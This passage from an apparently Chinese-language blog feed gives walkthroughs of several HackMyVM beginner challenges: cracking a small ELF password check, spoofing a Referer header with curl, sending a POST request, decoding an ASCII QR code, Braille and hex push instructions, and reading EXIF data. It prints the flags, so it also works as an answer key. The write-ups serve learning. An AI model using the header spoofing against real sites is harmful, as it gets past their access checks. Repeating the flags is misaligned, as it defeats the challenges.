AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFARAAAAAAAAEBEAAAAA
AAABAAAAAAAAAD8AAAAAAAAADAAAAAAAAAAAEAAAAAAAAA0AAAAAAAAAqBIAAAAAAAAZAAAAAAAA
ANA9AAAAAAAAGwAAAAAAAAAIAAAAAAAAABoAAAAAAAAA2D0AAAAAAAAcAAAAAAAAAAgAAAAAAAAA
9f7/bwAAAACgAwAAAAAAAAUAAAAAAAAAoAQAAAAAAAAGAAAAAAAAAMgDAAAAAAAACgAAAAAAAACv
AAAAAAAAAAsAAAAAAAAAGAAAAAAAAAAVAAAAAAAAAAAAAAAAAAAAAwAAAAAAAADoPwAAAAAAAAIA
AAAAAAAASAAAAAAAAAAUAAAAAAAAAAcAAAAAAAAAFwAAAAAAAABoBgAAAAAAAAcAAAAAAAAAqAUA
AAAAAAAIAAAAAAAAAMAAAAAAAAAACQAAAAAAAAAYAAAAAAAAAPv//28AAAAAAAAACAAAAAD+//9v
AAAAAGgFAAAAAAAA////bwAAAAABAAAAAAAAAPD//28AAAAAUAUAAAAAAAD5//9vAAAAAAMAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAA4D0AAAAAAAAAAAAAAAAAAAAAAAAAAAAANhAAAAAAAABGEAAAAAAAAFYQAAAAAAAA
AAAAAAAAAAAgQAAAAAAAAEdDQzogKERlYmlhbiAxMi4yLjAtMSkgMTIuMi4wAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAACQAAAAEABAB8AwAAAAAAACAA
AAAAAAAAEwAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAHgAAAAIADwCgEAAAAAAAAAAAAAAAAAAAIAAA
AAIADwDQEAAAAAAAAAAAAAAAAAAAMwAAAAIADwAQEQAAAAAAAAAAAAAAAAAASQAAAAEAGgAoQAAA
AAAAAAEAAAAAAAAAVQAAAAEAFQDYPQAAAAAAAAAAAAAAAAAAfAAAAAIADwBQEQAAAAAAAAAAAAAA
AAAAiAAAAAEAFADQPQAAAAAAAAAAAAAAAAAApwAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAEwAAAAQA
8f8AAAAAAAAAAAAAAAAAAAAArgAAAAEAEwAoIQAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAA
AAAAAAAAAAAAvAAAAAEAFgDgPQAAAAAAAAAAAAAAAAAAxQAAAAAAEgBUIAAAAAAAAAAAAAAAAAAA
2AAAAAEAGADoPwAAAAAAAAAAAAAAAAAA7gAAABIAAAAAAAAAAAAAAAAAAAAAAAAACwEAACAAAAAA
AAAAAAAAAAAAAAAAAAAAXAEAACAAGQAYQAAAAAAAAAAAAAAAAAAAJwEAABAAGQAoQAAAAAAAAAAA
AAAAAAAALgEAABICEACoEgAAAAAAAAAAAAAAAAAANAEAABIAAAAAAAAAAAAAAAAAAAAAAAAARwEA
ABIAAAAAAAAAAAAAAAAAAAAAAAAAWgEAABAAGQAYQAAAAAAAAAAAAAAAAAAAZwEAACAAAAAAAAAA
AAAAAAAAAAAAAAAAdgEAABECGQAgQAAAAAAAAAAAAAAAAAAAgwEAABEAEQAAIAAAAAAAAAQAAAAA
AAAAkgEAABAAGgAwQAAAAAAAAAAAAAAAAAAAYAEAABIADwBwEAAAAAAAACIAAAAAAAAAlwEAABAA
GgAoQAAAAAAAAAAAAAAAAAAAowEAABIADwBZEQAAAAAAAE8BAAAAAAAAqAEAABIAAAAAAAAAAAAA
AAAAAAAAAAAAwQEAABECGQAoQAAAAAAAAAAAAAAAAAAAzQEAACAAAAAAAAAAAAAAAAAAAAAAAAAA
5wEAACIAAAAAAAAAAAAAAAAAAAAAAAAAAgIAABICDAAAEAAAAAAAAAAAAAAAAAAAAFNjcnQxLm8A
X19hYmlfdGFnAGNydHN0dWZmLmMAZGVyZWdpc3Rlcl90bV9jbG9uZXMAX19kb19nbG9iYWxfZHRv
cnNfYXV4AGNvbXBsZXRlZC4wAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eF9maW5pX2FycmF5X2VudHJ5
AGZyYW1lX2R1bW15AF9fZnJhbWVfZHVtbXlfaW5pdF9hcnJheV9lbnRyeQBmaWxlLmMAX19GUkFN
RV9FTkRfXwBfRFlOQU1JQwBfX0dOVV9FSF9GUkFNRV9IRFIAX0dMT0JBTF9PRkZTRVRfVEFCTEVf
AF9fbGliY19zdGFydF9tYWluQEdMSUJDXzIuMzQAX0lUTV9kZXJlZ2lzdGVyVE1DbG9uZVRhYmxl
AF9lZGF0YQBfZmluaQBzdHJsZW5AR0xJQkNfMi4yLjUAcHJpbnRmQEdMSUJDXzIuMi41AF9fZGF0
YV9zdGFydABfX2dtb25fc3RhcnRfXwBfX2Rzb19oYW5kbGUAX0lPX3N0ZGluX3VzZWQAX2VuZABf
X2Jzc19zdGFydABtYWluAF9faXNvYzk5X3NjYW5mQEdMSUJDXzIuNwBfX1RNQ19FTkRfXwBfSVRN
X3JlZ2lzdGVyVE1DbG9uZVRhYmxlAF9fY3hhX2ZpbmFsaXplQEdMSUJDXzIuMi41AF9pbml0AAAu
c3ltdGFiAC5zdHJ0YWIALnNoc3RydGFiAC5pbnRlcnAALm5vdGUuZ251LnByb3BlcnR5AC5ub3Rl
LmdudS5idWlsZC1pZAAubm90ZS5BQkktdGFnAC5nbnUuaGFzaAAuZHluc3ltAC5keW5zdHIALmdu
dS52ZXJzaW9uAC5nbnUudmVyc2lvbl9yAC5yZWxhLmR5bgAucmVsYS5wbHQALmluaXQALnBsdC5n
b3QALnRleHQALmZpbmkALnJvZGF0YQAuZWhfZnJhbWVfaGRyAC5laF9mcmFtZQAuaW5pdF9hcnJh
eQAuZmluaV9hcnJheQAuZHluYW1pYwAuZ290LnBsdAAuZGF0YQAuYnNzAC5jb21tZW50AAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAbAAAAAQAAAAIAAAAAAAAAGAMAAAAAAAAYAwAAAAAAABwAAAAAAAAAAAAAAAAAAAAB
AAAAAAAAAAAAAAAAAAAAIwAAAAcAAAACAAAAAAAAADgDAAAAAAAAOAMAAAAAAAAgAAAAAAAAAAAA
AAAAAAAACAAAAAAAAAAAAAAAAAAAADYAAAAHAAAAAgAAAAAAAABYAwAAAAAAAFgDAAAAAAAAJAAA
AAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABJAAAABwAAAAIAAAAAAAAAfAMAAAAAAAB8AwAA
AAAAACAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAVwAAAPb//28CAAAAAAAAAKADAAAA
AAAAoAMAAAAAAAAkAAAAAAAAAAYAAAAAAAAACAAAAAAAAAAAAAAAAAAAAGEAAAALAAAAAgAAAAAA
AADIAwAAAAAAAMgDAAAAAAAA2AAAAAAAAAAHAAAAAQAAAAgAAAAAAAAAGAAAAAAAAABpAAAAAwAA
AAIAAAAAAAAAoAQAAAAAAACgBAAAAAAAAK8AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA
cQAAAP///28CAAAAAAAAAFAFAAAAAAAAUAUAAAAAAAASAAAAAAAAAAYAAAAAAAAAAgAAAAAAAAAC
AAAAAAAAAH4AAAD+//9vAgAAAAAAAABoBQAAAAAAAGgFAAAAAAAAQAAAAAAAAAAHAAAAAQAAAAgA
AAAAAAAAAAAAAAAAAACNAAAABAAAAAIAAAAAAAAAqAUAAAAAAACoBQAAAAAAAMAAAAAAAAAABgAA
AAAAAAAIAAAAAAAAABgAAAAAAAAAlwAAAAQAAABCAAAAAAAAAGgGAAAAAAAAaAYAAAAAAABIAAAA
AAAAAAYAAAAYAAAACAAAAAAAAAAYAAAAAAAAAKEAAAABAAAABgAAAAAAAAAAEAAAAAAAAAAQAAAA
AAAAFwAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACcAAAAAQAAAAYAAAAAAAAAIBAAAAAA
AAAgEAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAApwAAAAEAAAAGAAAAAAAA
AGAQAAAAAAAAYBAAAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAALAAAAABAAAA
BgAAAAAAAABwEAAAAAAAAHAQAAAAAAAAOAIAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAC2
AAAAAQAAAAYAAAAAAAAAqBIAAAAAAACoEgAAAAAAAAkAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAA
AAAAAAAAvAAAAAEAAAACAAAAAAAAAAAgAAAAAAAAACAAAAAAAABSAAAAAAAAAAAAAAAAAAAABAAA
AAAAAAAAAAAAAAAAAMQAAAABAAAAAgAAAAAAAABUIAAAAAAAAFQgAAAAAAAALAAAAAAAAAAAAAAA
AAAAAAQAAAAAAAAAAAAAAAAAAADSAAAAAQAAAAIAAAAAAAAAgCAAAAAAAACAIAAAAAAAAKwAAAAA
AAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA3AAAAA4AAAADAAAAAAAAANA9AAAAAAAA0C0AAAAA
AAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAOgAAAAPAAAAAwAAAAAAAADYPQAAAAAA
ANgtAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAAD0AAAABgAAAAMAAAAAAAAA
4D0AAAAAAADgLQAAAAAAAOABAAAAAAAABwAAAAAAAAAIAAAAAAAAABAAAAAAAAAAqwAAAAEAAAAD
AAAAAAAAAMA/AAAAAAAAwC8AAAAAAAAoAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAP0A
AAABAAAAAwAAAAAAAADoPwAAAAAAAOgvAAAAAAAAMAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAA
AAAAAAAGAQAAAQAAAAMAAAAAAAAAGEAAAAAAAAAYMAAAAAAAABAAAAAAAAAAAAAAAAAAAAAIAAAA
AAAAAAAAAAAAAAAADAEAAAgAAAADAAAAAAAAAChAAAAAAAAAKDAAAAAAAAAIAAAAAAAAAAAAAAAA
AAAAAQAAAAAAAAAAAAAAAAAAABEBAAABAAAAMAAAAAAAAAAAAAAAAAAAACgwAAAAAAAAHgAAAAAA
AAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAABIMAAAAAAA
AJADAAAAAAAAHQAAABIAAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAA
2DMAAAAAAAAIAgAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAADAAAAAAAAAAAAAAAA
AAAAAAAAAOA1AAAAAAAAGgEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=                                                                                                                                                                                   
```

![image-20250612184500514](https://7r1umphk.github.io/image/202506121845914.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ base64 -d 21.txt &gt; 21
base64: invalid input
                         
```

忽略非法字符

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ base64 -d -i 21.txt &gt; 21
        
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ file 21            
21: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8d11d870b5649e8ca1a0b6777160c1fc53f1f051, for GNU/Linux 3.2.0, not stripped
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ./21       
Enter passwd: 123456
Almost                                                                                                                                                                       
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ strings 21                 
/lib64/ld-linux-x86-64.so.2
__cxa_finalize
__libc_start_main
strlen
__isoc99_scanf
printf
libc.so.6
GLIBC_2.7
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
$uperZecretP4zz
Enter passwd: 
Almost
Correct
really close
Close
Incorrect
;*3$'
GCC: (Debian 12.2.0-1) 12.2.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
file.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_start_main@GLIBC_2.34
_ITM_deregisterTMCloneTable
_edata
_fini
strlen@GLIBC_2.2.5
printf@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
_end
__bss_start
main
__isoc99_scanf@GLIBC_2.7
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
_init
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
       
```

ida

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[264]; // [rsp+0h] [rbp-120h] BYREF
  const char *v5; // [rsp+108h] [rbp-18h]
  int i; // [rsp+114h] [rbp-Ch]
  int v7; // [rsp+118h] [rbp-8h]
  int v8; // [rsp+11Ch] [rbp-4h]

  v5 = '$uperZecretP4zz';
  v8 = 0;
  v7 = 1;
  printf('Enter passwd: ');
  __isoc99_scanf('%s', s);
  if ( strlen(s) == 6 )
  {
    if ( s[0] == 80 )
    {
      for ( i = 1; i &lt;= 5; ++i )
      {
        v8 += s[i] - 48;
        v7 *= s[i] - 48;
      }
      if ( v8 == 24 &amp;&amp; v7 == 2048 )
      {
        if ( s[1] == 56 )
          printf('Correct');
        else
          printf('really close');
      }
      else
      {
        printf('Close');
      }
    }
    else
    {
      printf('Almost');
    }
  }
  else
  {
    printf('Incorrect');
  }
  return 0;
}
```

分析

```
scanf('%s', s); // 用户输入密码，最多 263 字节，存在 s 数组中
if (strlen(s) == 6) // 密码长度必须是 6
{
    if (s[0] == 80) // 第一个字符必须是 ASCII 值 80 -&gt; 'P'
    {
        // 对后5位字符 (s[1] 到 s[5])，做以下处理：
        // 它们必须是数字字符（因为减去 '0'(48)），否则求和乘积会错误
        for (i = 1; i &lt;= 5; ++i)
        {
            v8 += s[i] - 48; // 加总
            v7 *= s[i] - 48; // 乘积
        }

        if (v8 == 24 &amp;&amp; v7 == 2048) // 满足加和与乘积条件
        {
            if (s[1] == 56) // 第二个字符必须是 '8'
                printf('Correct');
            else
                printf('really close');
        }
        else
        {
            printf('Close');
        }
    }
    else
    {
        printf('Almost');
    }
}
else
{
    printf('Incorrect');
}

```

**寻找一个以 'P8' 开头的6位密码，其后4位数字与数字8相加总和为24，相乘总积为2048。**

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ./21
Enter passwd: P84444
Correct                                                                                
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20021.html</guid><pubDate>Fri, 27 Jun 2025 09:32:02 +0000</pubDate></item><item><title>Challenge 020</title><link>https://7r1UMPHK.github.io/post/Challenge%20020.html</link><description>![image-20250612183946052](https://7r1umphk.github.io/image/202506121839359.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl http://momo.hackmyvm.eu/li0nsg3l9vhhe/                        
You are not coming from https://nepcodex.com/                                         
```

伪造`Referer` 请求头

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl -e https://nepcodex.com/ http://momo.hackmyvm.eu/li0nsg3l9vhhe/
HMV{youareawelcome}                                                                  
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20020.html</guid><pubDate>Fri, 27 Jun 2025 09:31:58 +0000</pubDate></item><item><title>Challenge 019</title><link>https://7r1UMPHK.github.io/post/Challenge%20019.html</link><description>![image-20250612183423004](https://7r1umphk.github.io/image/202506121834338.webp)

下载

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ll 019.zip        
-rwxr-xr-x 1 kali kali 276 Jun 12 06:34 019.zip
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ 7z x 019.zip                 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 276 bytes (1 KiB)

Extracting archive: 019.zip
--
Path = 019.zip
Type = zip
Physical Size = 276

Everything is Ok

Size:       588
Compressed: 276
          
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat 019.txt   
▄▄▄▄▄▄▄ ▄▄  ▄ ▄▄▄▄▄▄▄.█ ▄▄▄ █ ▄▀▄ █ █ ▄▄▄ █.█ ███ █ █▄▄█  █ ███ █.█▄▄▄▄▄█ ▄ ▄ ▄ █▄▄▄▄▄█.▄▄▄▄  ▄ ▄▀█▄▄▄  ▄▄▄ ▄.▀▄▀ ▄ ▄ ▄█▄▀ ▄██▀▀ ▄▄. █▄██▄▄███▀▄▄ ▄█ █▄▀▄.▄▄▄▄▄▄▄ ▀▄█▄▀  ▄█ ▄ ▀.█ ▄▄▄ █  ▄▄ ▀▀  ▀▀█▄▀.█ ███ █ █▀▄███ ▀ ▄▀▀ .█▄▄▄▄▄█ █▀ ▀▀▀█▀▄ ▄ ▀                                                                                                                                                          
```

看着像qr码

找规律，最后都有点，过滤一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat 019.txt | tr '.' '\n' 
▄▄▄▄▄▄▄ ▄▄  ▄ ▄▄▄▄▄▄▄
█ ▄▄▄ █ ▄▀▄ █ █ ▄▄▄ █
█ ███ █ █▄▄█  █ ███ █
█▄▄▄▄▄█ ▄ ▄ ▄ █▄▄▄▄▄█
▄▄▄▄  ▄ ▄▀█▄▄▄  ▄▄▄ ▄
▀▄▀ ▄ ▄ ▄█▄▀ ▄██▀▀ ▄▄
 █▄██▄▄███▀▄▄ ▄█ █▄▀▄
▄▄▄▄▄▄▄ ▀▄█▄▀  ▄█ ▄ ▀
█ ▄▄▄ █  ▄▄ ▀▀  ▀▀█▄▀
█ ███ █ █▀▄███ ▀ ▄▀▀ 
█▄▄▄▄▄█ █▀ ▀▀▀█▀▄ ▄ ▀                                                                                                                                                                                    
```

草料解一下https://cli.im/deqr/other

![image-20250612183849873](https://7r1umphk.github.io/image/202506121838056.webp)

```
HMV{asciiartt}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20019.html</guid><pubDate>Fri, 27 Jun 2025 09:31:56 +0000</pubDate></item><item><title>Challenge 018</title><link>https://7r1UMPHK.github.io/post/Challenge%20018.html</link><description>![image-20250612182911676](https://7r1umphk.github.io/image/202506121829958.webp)

```
http://momo.hackmyvm.eu/ZiP004JfyGh/
```

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl http://momo.hackmyvm.eu/ZiP004JfyGh/
&lt;!doctype html&gt;
&lt;html lang='en'&gt;
&lt;title&gt;018&lt;/title&gt;
Maybe the flag is in aaAxghuyrtlksd.php
&lt;/html&gt;
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl http://momo.hackmyvm.eu/ZiP004JfyGh/aaAxghuyrtlksd.php
Yes, I have the flag! :)      

┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl -i http://momo.hackmyvm.eu/ZiP004JfyGh/aaAxghuyrtlksd.php
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Thu, 12 Jun 2025 10:30:38 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive

Yes, I have the flag! :)                                                                
```

POST请求

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl -X POST http://momo.hackmyvm.eu/ZiP004JfyGh/aaAxghuyrtlksd.php   
HMV{postpostpost}                                                                     
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20018.html</guid><pubDate>Fri, 27 Jun 2025 09:31:53 +0000</pubDate></item><item><title>Challenge 017</title><link>https://7r1UMPHK.github.io/post/Challenge%20017.html</link><description>![image-20250612182714769](https://7r1umphk.github.io/image/202506121827070.webp)

```
⠓⠍⠧{⠊⠙⠕⠝⠞⠅⠝⠕⠺⠃⠗⠁⠊⠇⠇⠑}
```

盲文

https://zh.wikipedia.org/wiki/%E7%9B%B2%E6%96%87

自己对着转

```
HMV{idontknowbraille}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20017.html</guid><pubDate>Fri, 27 Jun 2025 09:31:47 +0000</pubDate></item><item><title>Challenge 015</title><link>https://7r1UMPHK.github.io/post/Challenge%20015.html</link><description>**挑战链接:** https://hackmyvm.eu/challenges/challenge.php?c=015

![挑战图片](https://7r1umphk.github.io//image/20250518141943225.webp)

## 1. 初步分析

挑战页面显示了一段被 `&lt;pre&gt;` 标签包裹的文本：

```html
&lt;pre&gt; push 7d616579 push 74696874 push 726f7773 push 696d7361 push 7b766d68 &lt;/pre&gt;
```

该文本包含一系列 `push` 指令，后跟十六进制数值。`push` 操作通常用于将数据压入栈中，而栈是后进先出 (LIFO) 的数据结构。这意味着最后压入的数据会最先被取出。
这些十六进制数值 `7d616579`, `74696874`, `726f7773`, `696d7361`, `7b766d68` 组合起来构成了 Flag 的某种编码形式。

## 2. 解密过程

为了得到原始 Flag，我们需要将这些十六进制数值转换为 ASCII 字符，并考虑到栈的 LIFO 特性以及数据在内存中的存储方式（通常是小端序，即字节序反转）。

### 2.1 使用 CyberChef 进行快速解码

CyberChef 提供了一种非常便捷的方式来处理这种转换。可以使用以下步骤：

1.  **准备输入数据:**
    将页面上给出的十六进制数值按照它们 `push` 的原始顺序列出，并用空格分隔：
    `7d616579 74696874 726f7773 696d7361 7b766d68`

2.  **在 CyberChef 中配置操作:**
    *   **Input:** 将上述准备好的十六进制字符串粘贴到输入框。
    *   **Recipe:**
        1.  `From Hex` (Delimiter: `Auto`)：此操作会将十六进制字符串转换为对应的字节序列（ASCII 字符）。
        2.  `Reverse` (By: `Character`)：由于栈是 LIFO 的，并且每个 `push` 的多字节数据（如 dword）在内存中通常是小端存储（字节反序），将整个转换后的字符串反转可以一次性处理这两个反转需求。

    CyberChef 的操作界面和结果如下所示：
    
    ![image-20250518142527284](https://7r1umphk.github.io//image/20250518142527578.webp)

    *   **Input:** `7d616579 74696874 726f7773 696d7361 7b766d68`
    *   **Step 1 (From Hex):** 这一步会将输入的十六进制字符串转换为其对应的 ASCII 字符。例如，`7d` 变为 `}`，`61` 变为 `a`，以此类推。由于输入中有空格，CyberChef (Delimiter: Auto) 会将它们视为分隔符，正确处理每个十六进制数。
        中间结果（逻辑上的，CyberChef直接处理）：`yea}thitsworasmihmv{` (注意，这已经是考虑了每个4字节块内部小端序后的结果，但顺序还是原始push的顺序)
    *   **Step 2 (Reverse by Character):** 将上一步得到的整个字符串进行反转。
        `yea}thitsworasmihmv{` 反转后得到 `hmv{asmisworthityea}`

    **Output:** `hmv{asmisworthityea}`

## 3. Flag

最终的 Flag 是：
```
HMV{asmisworthityea}
```
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20015.html</guid><pubDate>Fri, 27 Jun 2025 09:31:26 +0000</pubDate></item><item><title>Challenge 037</title><link>https://7r1UMPHK.github.io/post/Challenge%20037.html</link><description>![image-20250614105743955](https://7r1umphk.github.io/image/20250614105744262.webp)

还是扫街

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ll 037.zip 
-rwxr-xr-x 1 kali kali 6256698 Jun 13 22:57 037.zip
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ unzip 037.zip 
Archive:  037.zip
  inflating: osint.jpg               
             
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ exiftool osint.jpg 
ExifTool Version Number         : 13.25
File Name                       : osint.jpg
Directory                       : .
File Size                       : 6.3 MB
File Modification Date/Time     : 2023:07:17 21:14:46-04:00
File Access Date/Time           : 2025:06:13 22:58:07-04:00
File Inode Change Date/Time     : 2023:07:17 21:14:46-04:00
File Permissions                : -rwxr-xr-x
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian (Intel, II)
Make                            : Sony
Camera Model Name               : E5823
Orientation                     : Horizontal (normal)
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Software                        : 32.2.A.0.253_0_f500
Modify Date                     : 2016:07:25 20:44:46
Y Cb Cr Positioning             : Centered
Exposure Time                   : 1/2000
F Number                        : 2.0
ISO                             : 40
Exif Version                    : 0220
Date/Time Original              : 2016:07:25 20:44:46
Create Date                     : 2016:07:25 20:44:46
Components Configuration        : Y, Cb, Cr, -
Shutter Speed Value             : 1/1992
Exposure Compensation           : 0
Metering Mode                   : Multi-segment
Light Source                    : Unknown
Flash                           : Off, Did not fire
Focal Length                    : 4.2 mm
Soft Skin Effect                : Off
Face Info Offset                : 94
Sony Date Time                  : 2016:07:25 20:44:46
Sony Image Height               : 4160
Sony Image Width                : 5520
Faces Detected                  : 0
Face Info Length                : 26
Meta Version                    : 
Sub Sec Time                    : 461942
Sub Sec Time Original           : 461942
Sub Sec Time Digitized          : 461942
Flashpix Version                : 0100
Color Space                     : sRGB
Exif Image Width                : 5520
Exif Image Height               : 4140
Interoperability Index          : R98 - DCF basic file (sRGB)
Interoperability Version        : 0100
Custom Rendered                 : Normal
Exposure Mode                   : Auto
White Balance                   : Auto
Digital Zoom Ratio              : 1
Scene Capture Type              : Landscape
Subject Distance Range          : Unknown
GPS Version ID                  : 2.2.0.0
GPS Latitude Ref                : North
GPS Longitude Ref               : East
GPS Altitude Ref                : Above Sea Level
GPS Time Stamp                  : 18:44:29
GPS Status                      : Measurement Active
GPS Map Datum                   : WGS-84
GPS Date Stamp                  : 2016:07:25
Compression                     : JPEG (old-style)
Thumbnail Offset                : 21346
Thumbnail Length                : 3982
Image Width                     : 5520
Image Height                    : 4140
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Aperture                        : 2.0
